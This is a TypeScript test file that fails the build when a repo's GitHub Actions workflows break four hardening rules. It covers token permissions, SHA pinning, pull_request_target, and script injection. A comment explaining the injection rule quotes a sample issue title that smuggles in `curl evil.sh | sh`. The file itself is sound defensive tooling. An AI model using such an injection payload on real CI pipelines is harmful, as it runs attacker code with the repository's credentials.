import { existsSync, readFileSync, readdirSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';

/**
 * Gate: the four GitHub Actions hardening rules that are checkable from the repo, turned into a
 * failing test. A workflow is the one place in a repo where third-party code runs with the repo's own
 * credentials, so a weakness here is not scoped to one feature.
 *
 * Measured across this platform 2026-07-30, before this gate existed: 0 of 8 workflows declared
 * top-level `permissions:`, and 0 of 8 pinned any action to a commit SHA across 44 `uses:` sites.
 * Every one of them had been reviewed at least once by a human who knew about least privilege.
 *
 * RULE 1 — top-level `permissions:`. Without it the GITHUB_TOKEN falls back to the repository default,
 *   which on an older repo is read/write for every job. A job that runs `npm ci` executes arbitrary
 *   dependency postinstall scripts; that job should not hold a token that can push. Declaring the
 *   minimum at the top level and widening per job is GitHub's own documented shape.
 *
 * RULE 2 — a third-party action is pinned to a full 40-hex commit SHA, not a tag. A tag is mutable:
 *   `tj-actions/changed-files` (CVE-2025-30066) was compromised by repointing existing tags at a
 *   malicious commit, which reached every workflow referencing it by tag, retroactively. Keep the
 *   human-readable version in a trailing comment: `uses: owner/action@<sha> # v4.2.2`.
 *
 *   `trustedOwners` exempts first-party namespaces (actions, github, docker) by default, because that
 *   is where the published guidance draws the line and pinning them forfeits automatic patches for a
 *   materially smaller risk. That exemption is a JUDGEMENT, not a fact — set `"strict": true` in
 *   docs/gates.json to require SHA pinning everywhere, which is the stronger and defensible position.
 *
 * RULE 3 — no `pull_request_target`. It runs with a read/write token and access to secrets in the
 *   context of a pull request whose code the author controls; combined with a checkout of the PR head
 *   it is direct repository compromise. `pull_request` is almost always what was meant.
 *
 * RULE 4 — no attacker-controlled context interpolated into a `run:` block. An issue title of
 *   `a"; curl evil.sh | sh; #` is substituted into the shell VERBATIM before the script runs, so this
 *   is command injection with no quoting that can save it. Pass the value through `env:` and reference
 *   it as "$VAR", which the shell treats as data.
 *
 * Exceptions use the same vocabulary as the platform's other gates, with the same 20-character reason
 * floor — writing the sentence is the point:
 *   - inline: `# rulebook-allow: ci-hardening — <reason>` on the offending line or the line above
 *   - per repo: docs/gates.json → { "ci-hardening": { "strict": false, "trustedOwners": [...],
 *                                                     "allow": ["path/to/workflow.yml"] } }
 */

const WORKFLOW_DIR = join('.github', 'workflows');
const DEFAULT_TRUSTED_OWNERS = ['actions', 'github', 'docker'];

const RULE_ID = 'ci-hardening';
const ALLOW_LINE = new RegExp(`rulebook-allow:\\s*${RULE_ID}\\s*[—:-]\\s*(.+)$`);
const MIN_REASON = 20;
const reasoned = (match: RegExpMatchArray | null) => (match?.[1]?.trim().length ?? 0) >= MIN_REASON;

/** `uses: owner/repo@ref` or `uses: owner/repo/sub@ref`. Excludes `./local` and `docker://`. */
const USES = /^\s*(?:-\s*)?uses:\s*['"]?([^'"@\s]+)@([^'"\s]+)/;
const FULL_SHA = /^[0-9a-f]{40}$/;

/**
 * Contexts an outside contributor can set the text of. `github.event.*.body|title`, the PR head ref,
 * and comment/review bodies are the documented injection sinks.
 */
const UNTRUSTED_CONTEXT =
  /\$\{\{\s*(?:github\.head_ref|github\.event\.(?:issue|pull_request|comment|review|discussion|head_commit)?\.?[\w.]*(?:title|body|ref|label|name|email|message))/;

interface GateConfig {
  strict?: boolean;
  trustedOwners?: string[];
  allow?: string[];
}

function readConfig(): GateConfig {
  const path = join(process.cwd(), 'docs', 'gates.json');
  if (!existsSync(path)) return {};
  const parsed: unknown = JSON.parse(readFileSync(path, 'utf8'));
  return ((parsed as Record<string, unknown>)?.[RULE_ID] as GateConfig) ?? {};
}

function workflowFiles(): string[] {
  if (!existsSync(WORKFLOW_DIR)) return [];
  return readdirSync(WORKFLOW_DIR)
    .filter((entry) => /\.ya?ml$/.test(entry))
    .map((entry) => join(WORKFLOW_DIR, entry).split('\\').join('/'));
}

/**
 * True while the line sits inside a `run:` block. Tracked by indentation because a run block is a YAML
 * scalar: it ends at the first line indented no deeper than the `run:` key itself.
 */
function runBlockTracker() {
  let runIndent: number | null = null;
  return (line: string): boolean => {
    const indent = line.length - line.trimStart().length;
    if (runBlockTracker.isBlank(line)) return runIndent !== null;
    if (runIndent !== null && indent <= runIndent) runIndent = null;
    const match = /^(\s*)(?:-\s*)?run:\s*[|>]?/.exec(line);
    if (match) {
      runIndent = match[1].length;
      return true;
    }
    return runIndent !== null;
  };
}
runBlockTracker.isBlank = (line: string) => line.trim() === '';

describe('GitHub Actions workflows are hardened', () => {
  it('passes the four checkable hardening rules', () => {
    const config = readConfig();
    const trusted = new Set(config.trustedOwners ?? DEFAULT_TRUSTED_OWNERS);
    const skip = new Set(config.allow ?? []);
    const findings: string[] = [];

    for (const file of workflowFiles()) {
      if (skip.has(file)) continue;
      const lines = readFileSync(file, 'utf8').split('\n');
      const excused = (index: number) =>
        reasoned((lines[index] ?? '').match(ALLOW_LINE)) ||
        reasoned((lines[index - 1] ?? '').match(ALLOW_LINE));
      const at = (index: number) => `${file}:${index + 1}`;

      // RULE 1 — a top-level key sits at column 0.
      if (!lines.some((line) => /^permissions:/.test(line))) {
        findings.push(
          `${file}: no top-level \`permissions:\` — every job inherits the repository default token ` +
            `scope. Add \`permissions:\\n  contents: read\` at column 0 and widen per job.`,
        );
      }

      const inRun = runBlockTracker();
      lines.forEach((line, index) => {
        const insideRun = inRun(line);

        // RULE 2 — third-party actions pinned by SHA.
        const uses = USES.exec(line);
        if (uses && !uses[1].startsWith('.') && !uses[1].startsWith('docker://')) {
          const [, action, ref] = uses;
          const owner = action.split('/')[0];
          const mustPin = config.strict === true || !trusted.has(owner);
          if (mustPin && !FULL_SHA.test(ref) && !excused(index)) {
            findings.push(
              `${at(index)}: \`${action}@${ref}\` is pinned to a mutable ref. Use the full 40-char ` +
                `commit SHA with the version in a trailing comment.`,
            );
          }
        }

        // RULE 3 — the pull_request_target trigger.
        if (/pull_request_target/.test(line) && !excused(index)) {
          findings.push(
            `${at(index)}: \`pull_request_target\` runs untrusted PR code with a write token and ` +
              `secrets. Use \`pull_request\` unless there is a written reason not to.`,
          );
        }

        // RULE 4 — untrusted context substituted into a shell script.
        if (insideRun && UNTRUSTED_CONTEXT.test(line) && !excused(index)) {
          findings.push(
            `${at(index)}: attacker-controlled context interpolated into \`run:\` — command ` +
              `injection. Pass it via \`env:\` and reference "$VAR" instead.`,
          );
        }
      });
    }

    // One list, so a failure names every site at once rather than one per run.
    expect(findings, `GitHub Actions hardening findings:\n${findings.join('\n')}`).toEqual([]);
  });
});
